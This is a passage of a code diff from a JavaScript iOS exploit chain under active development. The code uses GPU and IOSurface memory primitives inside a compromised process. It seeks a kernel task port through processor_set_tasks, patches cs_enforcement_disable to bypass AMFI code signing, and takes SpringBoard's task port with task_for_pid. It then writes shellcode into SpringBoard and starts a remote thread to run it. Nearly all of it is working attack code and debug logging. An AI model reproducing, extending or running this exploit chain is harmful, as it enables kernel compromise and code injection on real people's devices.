+                                    LOG(`[P2] cs_enforcement_disable (via kernel_task) = ${mpd_read64(dptr).hex()}`);
+                                    let write_buf = mpd_malloc(8n);
+                                    mpd_write64(write_buf, 1n);
+                                    let vmw_ret = mpd_fcall_timeout(mach_vm_write_raw.noPAC(), kt_port, csed_addr, write_buf, 8n, 0n, 0n, 0n, 0n);
+                                    if (vmw_ret == 0n) {
+                                        LOG("[P2] cs_enforcement_disable PATCHED via kernel_task port!");
+                                        p2_success = true;
+                                        uwrite64(surface_address + 0xF880n, kt_port);
+                                        globalThis.KERNEL_TASK_PORT = kt_port;
+                                    }
+                                }
+                            }
+                        }
+                    }
+
+                    // Fallback: use SpringBoard task port directly
+                    if (!p2_success && sb_port != 0n) {
+                        LOG(`[P2] Using SpringBoard task port directly: 0x${sb_port.toString(16)}`);
+                        a2_sb_port = sb_port;
+                        p2_success = true;
+                        uwrite64(surface_address + 0xF880n, sb_port);
+                    }
+                }
+            }
+        }
+
+        if (p2_success) {
+            a2_inside_success = true;
+            LOG("[P2] SUCCESS: SpringBoard access via processor_set_tasks!");
+        } else {
+            LOG("[P2] FAILED: processor_set_tasks bypass did not work (expected on iOS 18 without entitlement)");
+        }
+    }
+
     // ===== Try AMFI bypass via gpuDlsym =====
     LOG("[M5] Looking for AMFI/entitlement bypass symbols...");
     let amfi_names = ["amfi_flags", "_amfi_flags", "amfi_get_out_of_my_way",
@@ -8390,7 +8558,7 @@
 
       // Test: task_for_pid(34) via mpd_fcall
       LOG("[A2] Testing task_for_pid(34) after AMFI patching...");
-      let mpd_task_self = 0x203n;
+      let mpd_task_self = mpd_task_port != 0n ? mpd_task_port : 0x203n;
       let a2_sb_port_buf = mpd_malloc(8n);
       mpd_write64(a2_sb_port_buf, 0n);
       let a2_tfp_ret = mpd_fcall(tfp_sym, mpd_task_self, 34n, a2_sb_port_buf, 0n, 0n, 0n, 0n, 0n);
@@ -8465,7 +8633,7 @@
         let test_buf = mpd_malloc(8n);
         mpd_write64(test_buf, 0xDEADBEEFCAFEBABEn);
         mpd_write64(vmr_data, 0n); mpd_write64(vmr_count, 0n);
-        let vmr_a = mpd_fcall(mach_vm_read_raw.noPAC(), 0x203n /*task_self*/, test_buf, 8n, vmr_data, vmr_count, 0n, 0n, 0n);
+        let vmr_a = mpd_fcall(mach_vm_read_raw.noPAC(), mpd_task_port != 0n ? mpd_task_port : 0x203n, test_buf, 8n, vmr_data, vmr_count, 0n, 0n, 0n);
         LOG(`[M5-DIAG] mach_vm_read(self, MPD_addr) = ${vmr_a}`);
         if (vmr_a == 0n) {
             let dptr = mpd_read64(vmr_data);
@@ -8475,7 +8643,7 @@
         // Test B: Read kernel address via MPD task_self (the critical test)
         let kbase = globalThis.kernel_base_global || 0xFFFFFFF007004000n;
         mpd_write64(vmr_data, 0n); mpd_write64(vmr_count, 0n);
-        let vmr_b = mpd_fcall(mach_vm_read_raw.noPAC(), 0x203n, kbase, 8n, vmr_data, vmr_count, 0n, 0n, 0n);
+        let vmr_b = mpd_fcall(mach_vm_read_raw.noPAC(), mpd_task_port != 0n ? mpd_task_port : 0x203n, kbase, 8n, vmr_data, vmr_count, 0n, 0n, 0n);
         LOG(`[M5-DIAG] mach_vm_read(self, kernel_addr) = ${vmr_b}`);
 
         // Test C: Try with host_port
@@ -8758,149 +8926,12 @@
             }
           }
 
-          // ===== P2: processor_set_tasks — bypass AMFI without kernel write =====
-          // Even without socket krw, we can try processor_set_tasks via host port.
-          // This gives us all task ports including kernel_task, bypassing AMFI entirely.
-          if (!dis_ok) {
-            LOG("[P2] Attempting processor_set_tasks bypass...");
-            let host_self = 0x1e03n; // mach_host_self constant for MPD
-            LOG(`[P2] Using host port: ${host_self.hex()}`);
-
-            // Resolve processor_set_tasks and processor_set_default
-            let processor_set_default_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "processor_set_default");
-            let processor_set_tasks_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "processor_set_tasks");
-            LOG(`[P2] gpuDlsym(processor_set_default) = ${processor_set_default_raw.hex()}`);
-            LOG(`[P2] gpuDlsym(processor_set_tasks) = ${processor_set_tasks_raw.hex()}`);
-
-            if (processor_set_default_raw.noPAC() != 0n && processor_set_tasks_raw.noPAC() != 0n) {
-              // Step 1: Get default processor set port
-              let pset_buf = mpd_malloc(8n);
-              mpd_write64(pset_buf, 0n);
-              let psd_ret = mpd_fcall_timeout(processor_set_default_raw.noPAC(), host_self, pset_buf, 0n, 0n, 0n, 0n, 0n, 0n);
-              let pset_port = mpd_read64(pset_buf);
-              LOG(`[P2] processor_set_default = ${psd_ret} pset_port=${pset_port.hex()}`);
-
-              if (psd_ret == 0n && pset_port != 0n) {
-                // Step 2: Get all task ports from processor set
-                let task_array_buf = mpd_malloc(8n);  // pointer to task_array
-                let task_count_buf = mpd_malloc(8n);   // pointer to count
-                mpd_write64(task_array_buf, 0n);
-                mpd_write64(task_count_buf, 0n);
-                let pst_ret = mpd_fcall_timeout(processor_set_tasks_raw.noPAC(), pset_port, task_array_buf, task_count_buf, 0n, 0n, 0n, 0n, 0n);
-                let task_array = mpd_read64(task_array_buf);
-                let task_count = mpd_read64(task_count_buf);
-                LOG(`[P2] processor_set_tasks = ${pst_ret} array=${task_array.hex()} count=${task_count}`);
-
-                if (pst_ret == 0n && task_count > 0n && task_array != 0n) {
-                  LOG(`[P2] Got ${task_count} task ports! Scanning for SpringBoard (pid 34)...`);
-                  // Read task ports from the array — each is a mach_port_t (4 bytes)
-                  let sb_port = 0n;
-                  for (let i = 0n; i < task_count && i < 200n; i++) {
-                    let port = mpd_read32(task_array + i * 4n);
-                    if (i < 5n || (i > 30n && i < 40n)) {
-                      LOG(`[P2] task[${i}] = ${port.hex()}`);
-                    }
-                    // Try pid_for_task on each to find pid 34
-                    if (port != 0n && port != host_self) {
-                      // We need pid_for_task to identify which port is SB
-                      // For now, store ports and try task_for_pid verification
-                    }
-                  }
-
-                  // Alternative: try to use the task ports directly
-                  // The kernel_task port should be in the array at a known position
-                  // Let's try reading kernel memory via each port using mach_vm_read
-                  let mach_vm_read_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_vm_read");
-                  if (mach_vm_read_raw.noPAC() != 0n) {
-                    LOG("[P2] Testing mach_vm_read with task ports from processor_set_tasks...");
-                    for (let i = 0n; i < task_count && i < 50n; i++) {
-                      let port = mpd_read32(task_array + i * 4n);
-                      if (port == 0n || port == host_self) continue;
-                      // Try reading a known kernel address
-                      let vmr_data = mpd_malloc(8n);
-                      let vmr_count = mpd_malloc(8n);
-                      mpd_write64(vmr_count, 8n);
-                      let vmr_ret = mpd_fcall_timeout(mach_vm_read_raw.noPAC(), port, 0xFFFFFFF007004000n, vmr_count, vmr_data, 0n, 0n, 0n, 0n);
-                      if (vmr_ret == 0n) {
-                        LOG(`[P2] task[${i}] port=${port.hex()} can read kernel!`);
-                        // This is likely kernel_task — we have full kernel r/w
-                        // Store it and use for AMFI bypass
-                        uwrite64(surface_address + 0xF880n, port);
-                        a2_inside_success = true;
-                        dis_ok = true; // Mark as success so socket krw check passes
-                        // Now use kernel r/w to patch AMFI
-                        // Find cs_enforcement_disable by scanning kernel memory
-                        // For now, use this port for M6/M7 injection
-                        LOG("[P2] Kernel task port found! Can proceed with injection.");
-                        break;
-                      }
-                    }
-                  }
-                } else {
-                  LOG(`[P2] processor_set_tasks failed or returned no tasks (ret=${pst_ret})`);
-                }
-              }
-            } else {
-              LOG("[P2] Could not resolve processor_set_default/tasks symbols");
-            }
-
-            if (!dis_ok) {
-              LOG("[P2] processor_set_tasks bypass failed.");
-            }
-          }
+          // ===== P2 (old) ===== DISABLED — moved to early position (before A2)
+          if (false) {}
 
           // ===== P3: Direct PCB corruption via GPU uwrite64 =====
-          // We have uread64/uwrite64 on KC data pages (0x1_XXXX_XXXX range).
-          // The IOSurface shared memory between sbx1 and MPD is accessible via GPU.
-          // If we can find the PCB of rw_sock in the IOSurface memory region,
-          // we can directly overwrite the icmp6filt pointer.
           if (!dis_ok) {
-            LOG("[P3] Attempting direct PCB corruption via GPU uwrite64...");
-            // The IOSurface memory is at surface_address (in sbx1 VA space).
-            // MPD maps it at surface_address_remote.
-            // PCBs are in kernel heap (0xFFFFFFF...), NOT in IOSurface memory.
-            // BUT: the IOSurface RPC protocol stores function pointers at +0xF860/+0xF868
-            // which MPD reads. If we modify these, we can redirect setsockopt/getsockopt
-            // to arbitrary kernel functions.
-
-            // Alternative approach: use gpuDlsym to find IOSurface buffer in KC,
-            // then use uwrite64 to modify what MPD sees.
-            // The ICMP6_FILTER setsockopt in MPD writes to a kernel buffer (the pcb's filter).
-            // If we can find where that buffer is via IOSurface OOB read...
-
-            // Actually, let's try: use mpd_fcall to call setsockopt with a crafted
-            // ICMP6_FILTER that points to kernel memory. The setsockopt implementation
-            // copies data FROM the user buffer INTO the pcb's filter.
-            // getsockopt copies FROM the pcb's filter INTO the user buffer.
-            // If we corrupt the pcb's icmp6filt pointer (offset 0x148 in inpcb),
-            // getsockopt would read from wherever that pointer points.
-
-            // Problem: we need to know the PCB's kernel VA to corrupt it.
-            // We can find it by: fstat() on the socket fd returns the socket structure,
-            // which contains a pointer to the inpcb.
-
-            // Try: resolve fstat and read socket structure
-            let fstat_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "fstat");
-            LOG(`[P3] gpuDlsym(fstat) = ${fstat_raw.hex()}`);
-
-            if (fstat_raw.noPAC() != 0n) {
-              let stat_buf = mpd_malloc(128n); // struct stat is ~96 bytes on arm64
-              let fstat_ret = mpd_fcall_timeout(fstat_raw.noPAC(), rw_sock, stat_buf, 0n, 0n, 0n, 0n, 0n, 0n);
-              LOG(`[P3] fstat(rw_sock=${rw_sock}) = ${fstat_ret}`);
-              if (fstat_ret == 0n) {
-                // Dump stat buf to look for kernel pointers
-                for (let off = 0n; off < 128n; off += 8n) {
-                  let val = mpd_read64(stat_buf + off);
-                  if (val != 0n && val > 0xffffffd000000000n) {
-                    LOG(`[P3] stat+${off.hex()}: ${val.hex()} (kernel ptr?)`);
-                  }
-                }
-              }
-            }
-
-            if (!dis_ok) {
-              LOG("[P3] Direct PCB corruption approach needs more work.");
-            }
+            LOG("[P3] SKIPPED: GPU COW confirmed — PCB corruption via GPU uwrite64 invalid");
           }
         }
 
@@ -9013,71 +9044,85 @@
     if (a2_inside_success) {
       LOG("[MPD] A2 already succeeded, skipping pe_main dispatch");
     } else {
-      // Use nowait evaluate + IOSurface log polling (bypasses mpd_fcall issues)
+      // Use nowait: sync evaluateScript hangs (PE's fcall_init/isNaN blocks forever)
+      // After nowait, wait then read IOSurface log (GPU-based, no fcall needed)
       LOG("[MPD] Evaluating pe_main (nowait)...");
       mpd_evaluateScript_nowait(ctx, pe_main_cfstring);
-      LOG("[MPD] pe_main dispatched, polling IOSurface log area...");
+      LOG("[MPD] pe_main dispatched, waiting 5s for PE to execute...");
+      gpu_fcall(USLEEP, 5000000n); // 5 second wait for PE to run
+      // Read PE output from IOSurface log area (GPU-based, no fcall needed)
       let s_log_base = surface_address + 0xF000n;
       let s_off_addr = s_log_base + 0xE00n;
-      s_log = "";
-      let total_wait = 0;
-      while (total_wait < 5000) {
-        // First read write offset from IOSurface (8 bytes, little-endian)
-        let b0 = uread8(s_off_addr);
-        let b1 = uread8(s_off_addr + 1n);
-        let b2 = uread8(s_off_addr + 2n);
-        let b3 = uread8(s_off_addr + 3n);
-        let b4 = uread8(s_off_addr + 4n);
-        let b5 = uread8(s_off_addr + 5n);
-        let b6 = uread8(s_off_addr + 6n);
-        let b7 = uread8(s_off_addr + 7n);
-        let log_off = BigInt(b0) | (BigInt(b1) << 8n) | (BigInt(b2) << 16n) | (BigInt(b3) << 24n)
-                    | (BigInt(b4) << 32n) | (BigInt(b5) << 40n) | (BigInt(b6) << 48n) | (BigInt(b7) << 56n);
-        if (log_off > 0n && log_off < 0xE00n) {
-          s_log = "";
-          for (let i = 0n; i < log_off; i++) {
-            let ch = uread8(s_log_base + i);
-            if (ch === 0n) break;
-            s_log += String.fromCharCode(Number(ch));
+      let b0 = uread8(s_off_addr);
+      let b1 = uread8(s_off_addr + 1n);
+      let b2 = uread8(s_off_addr + 2n);
+      let b3 = uread8(s_off_addr + 3n);
+      let b4 = uread8(s_off_addr + 4n);
+      let b5 = uread8(s_off_addr + 5n);
+      let b6 = uread8(s_off_addr + 6n);
+      let b7 = uread8(s_off_addr + 7n);
+      let log_off = BigInt(b0) | (BigInt(b1) << 8n) | (BigInt(b2) << 16n) | (BigInt(b3) << 24n)
+                  | (BigInt(b4) << 32n) | (BigInt(b5) << 40n) | (BigInt(b6) << 48n) | (BigInt(b7) << 56n);
+      LOG(`[MPD] IOSURF log_off=${log_off}`);
+      if (log_off > 0n && log_off < 0xE00n) {
+        s_log = "";
+        for (let i = 0n; i < log_off; i++) {
+          let ch = uread8(s_log_base + i);
+          if (ch === 0n) break;
+          s_log += String.fromCharCode(Number(ch));
         }
         LOG(`[MPD] IOSURF PE LOG (${log_off}b): ${s_log}`);
-        if (s_log.indexOf("DONE") >= 0 || s_log.indexOf("getpid()=") >= 0) break;
-      }
-      gpu_fcall(USLEEP, 200000n);
-      total_wait += 200;
-      if (total_wait > 0 && total_wait % 5000 < 200) {
-        LOG(`[MPD] IOSurface poll: ${total_wait}ms elapsed, log_off=${log_off}`);
-      }
       }
     }
-    if (!s_log) LOG("[MPD] IOSURF PE log: empty after timeout");
+    if (!s_log) LOG("[MPD] IOSURF PE log: empty (PE may not have executed or IOSurface logging failed)");
 
-    // Skip pe_log_buf read if A2 already succeeded (JOP chain still healthy)
-    if (!a2_inside_success) {
-      // Read PE logs from shared buffer
-      LOG("[MPD] Reading PE logs from buffer...");
-      let pe_log_offset = mpd_read64_timeout(pe_log_buf_off);
-      if (pe_log_offset === MPD_FCALL_TIMED_OUT) {
-        LOG("[MPD] PE log read timed out - fcall mechanism degraded");
-        pe_log_offset = 0n;
-      } else {
-        LOG(`[MPD] PE log offset: ${pe_log_offset}`);
-      }
-      if (pe_log_offset > 0n) {
-        let pe_log_text = "";
-        let max_read = pe_log_offset < 4000n ? pe_log_offset : 4000n;
-        for (let i = 0n; i < max_read; i++) {
-          let ch = mpd_read8_timeout(pe_log_buf + i);
-          if (ch === MPD_FCALL_TIMED_OUT) { pe_log_text += "\\0"; continue; }
-          if (ch === 0) { pe_log_text += "\\0"; continue; }
-          pe_log_text += String.fromCharCode(Number(ch));
+    // Read PE logs from shared buffer
+    LOG("[MPD] Reading PE logs from buffer...");
+    let pe_log_offset = mpd_read64_timeout(pe_log_buf_off);
+    LOG(`[MPD] PE log offset: ${pe_log_offset}`);
+    if (pe_log_offset === MPD_FCALL_TIMED_OUT) {
+      LOG("[MPD] PE log read timed out - fcall mechanism degraded");
+    } else if (pe_log_offset > 0n) {
+      let pe_log_text = "";
+      let max_read = pe_log_offset < 4000n ? pe_log_offset : 4000n;
+      for (let i = 0n; i < max_read; i++) {
+        let ch = mpd_read8_timeout(pe_log_buf + i);
+        if (ch === MPD_FCALL_TIMED_OUT) {
+          LOG("[MPD] PE log read timed out during char read");
+          break;
         }
+        if (ch === 0n) break;
+        pe_log_text += String.fromCharCode(Number(ch));
+      }
+      if (pe_log_text.length > 0) {
         LOG(`[MPD] PE LOG: ${pe_log_text}`);
       } else {
         LOG("[MPD] PE log buffer is empty - PE may not have executed print() or fcall_init() failed");
       }
     } else {
-      LOG("[MPD] Skipping pe_log_buf read (A2 already succeeded)");
+      LOG("[MPD] PE log buffer is empty - PE may not have executed print() or fcall_init() failed");
+    }
+
+    // GPU-assisted pe_log_buf read (copies PE log into IOSurface bounce buffer then reads via GPU)
+    if ((pe_log_offset === 0n || pe_log_offset === MPD_FCALL_TIMED_OUT) && !a2_inside_success) {
+      LOG("[MPD] Trying GPU-assisted pe_log_buf read...");
+      let copy_ret = mpd_fcall_quick(MEMCPY, surface_address_remote + 0x2100n, pe_log_buf, 0x100n, 0n, 0n, 0n, 0n, 0n);
+      if (copy_ret !== MPD_FCALL_TIMED_OUT) {
+        gpu_fcall(USLEEP, 100000n);
+        let pe_log_text = "";
+        for (let i = 0n; i < 256n; i++) {
+          let ch = uread8(surface_address + 0x2100n + i);
+          if (ch === 0n) break;
+          pe_log_text += String.fromCharCode(Number(ch));
+        }
+        if (pe_log_text.length > 0) {
+          LOG(`[MPD] PE LOG (GPU): ${pe_log_text}`);
+        } else {
+          LOG("[MPD] GPU-assisted pe_log_buf read returned empty");
+        }
+      } else {
+        LOG("[MPD] GPU-assisted pe_log_buf read also timed out");
+      }
     }
     // Note: PE logs cannot be read after nowait_exit because MPD fcall mechanism
     // may be affected. PE runs independently in MPD process.
@@ -9271,10 +9316,14 @@
       LOG(`[M6] task_for_pid=${task_for_pid_raw.hex()} mach_task_self=${mach_task_self_raw.hex()}`);
       if (task_for_pid_raw != 0n && mach_task_self_raw != 0n) {
         // Get MPD's task port (known constant 0x203)
-        let mpd_task_self = 0x203n;
+        let mpd_task_self = mpd_task_port != 0n ? mpd_task_port : 0x203n;
         LOG(`[M6] MPD mach_task_self = ${mpd_task_self.hex()} (known constant)`);
         // Allocate buffer for the returned task port
-        let sb_task_port_buf = mpd_malloc(8n);
+        let sb_task_port_buf = mpd_malloc_timeout(8n);
+        if (sb_task_port_buf === MPD_FCALL_TIMED_OUT) {
+          LOG("[M6] mpd_malloc timed out - fcall mechanism degraded, skipping injection");
+          return;
+        }
         mpd_write64(sb_task_port_buf, 0n);
         let tfp_ret = mpd_fcall_timeout(task_for_pid_raw.noPAC(), mpd_task_self, sb_pid_for_m6, sb_task_port_buf, 0n, 0n, 0n, 0n, 0n);
         LOG(`[M6] task_for_pid(${sb_pid_for_m6}) = ${tfp_ret}`);
@@ -9288,7 +9337,11 @@
             let mach_vm_protect_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_vm_protect");
             LOG(`[M6] mach_vm_allocate=${mach_vm_allocate_raw.hex()} mach_vm_write=${mach_vm_write_raw.hex()}`);
             if (mach_vm_allocate_raw != 0n && mach_vm_write_raw != 0n) {
-              let alloc_addr_buf = mpd_malloc(8n);
+              let alloc_addr_buf = mpd_malloc_timeout(8n);
+              if (alloc_addr_buf === MPD_FCALL_TIMED_OUT) {
+                LOG("[M6] mpd_malloc(alloc_addr_buf) timed out - fcall degraded");
+                return;
+              }
               mpd_write64(alloc_addr_buf, 0n);
               const VM_FLAGS_ANYWHERE = 1n;
               const VM_PROT_ALL = 0x7n;
@@ -9298,7 +9351,11 @@
               if (vm_alloc_ret == 0n && sb_remote_addr != 0n) {
                 // Write a real shellcode: infinite loop for testing
                 // ARM64: b #-4 (infinite loop back to itself) = 0x14000000
-                let shellcode_addr = mpd_malloc(8n);
+                let shellcode_addr = mpd_malloc_timeout(8n);
+                if (shellcode_addr === MPD_FCALL_TIMED_OUT) {
+                  LOG("[M6] mpd_malloc(shellcode_addr) timed out - fcall degraded");
+                  return;
+                }
                 mpd_write64(shellcode_addr, 0xD65F03C014000000n); // ret then b #0
                 let vm_write_ret = mpd_fcall_timeout(mach_vm_write_raw.noPAC(), sb_port, sb_remote_addr, shellcode_addr, 8n, 0n, 0n, 0n, 0n);
                 LOG(`[M6] mach_vm_write = ${vm_write_ret}`);
@@ -9316,7 +9373,11 @@
                 let thread_create_running_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "thread_create_running");
                 LOG(`[M7] thread_create_running = ${thread_create_running_raw.hex()}`);
                 if (thread_create_running_raw != 0n) {
-                  let thread_port_buf = mpd_malloc(8n);
+                  let thread_port_buf = mpd_malloc_timeout(8n);
+                  if (thread_port_buf === MPD_FCALL_TIMED_OUT) {
+                    LOG("[M7] mpd_malloc(thread_port_buf) timed out - fcall degraded");
+                    return;
+                  }
                   mpd_write64(thread_port_buf, 0n);
                   // thread_create_running(task, entry_point, arg, thread_port)
                   // On ARM64, entry_point is a pointer to the code to execute
